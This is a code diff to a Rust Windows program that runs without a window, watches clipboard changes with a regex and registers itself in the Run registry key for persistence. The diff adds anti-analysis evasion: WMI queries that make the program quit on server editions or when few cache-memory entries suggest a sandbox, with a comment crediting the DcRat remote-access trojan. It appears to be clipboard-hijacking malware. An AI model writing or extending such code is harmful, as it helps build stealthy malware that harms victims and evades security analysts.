@@ -1,6 +1,6 @@
 #![windows_subsystem = "windows"]
 mod constants;
-use std::{error::Error, ffi::CStr};
+use std::{collections::HashMap, error::Error, ffi::CStr, process};
 
 use regex::Regex;
 use winapi::{
@@ -24,6 +24,7 @@ use winapi::{
     },
 };
 use winreg::{enums::HKEY_CURRENT_USER, RegKey};
+use wmi::{COMLibrary, Variant, WMIConnection};
 
 unsafe fn clipboard_update(hwnd: HWND) {
     if OpenClipboard(hwnd) == 0 {
@@ -90,7 +91,33 @@ pub unsafe extern "system" fn window_proc(
     return DefWindowProcA(hwnd, msg, w_param, l_param);
 }
 
+fn detect_analysis_environment() -> Result<(), Box<dyn std::error::Error>> {
+    let con = WMIConnection::new(COMLibrary::new()?.into())?;
+    let results: Vec<HashMap<String, Variant>> =
+        con.raw_query("SELECT ProductType FROM Win32_OperatingSystem")?;
+
+    for result in results {
+        for value in result.values() {
+            if *value == Variant::UI4(2) || *value == Variant::UI4(3) {
+                process::exit(0);
+            }
+        }
+    }
+
+    let results: Vec<HashMap<String, Variant>> =
+        con.raw_query("SELECT * FROM Win32_CacheMemory")?;
+
+    if results.len() < 2 {
+        process::exit(0);
+    }
+
+    Ok(())
+}
+
 fn main() -> Result<(), Box<dyn Error>> {
+    // Method to decrypt analysis environment from https://github.com/qwqdanchun/DcRat
+    detect_analysis_environment()?;
+
     // Adds the current executable to startup
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
     let startup_key = hkcu.open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")?;
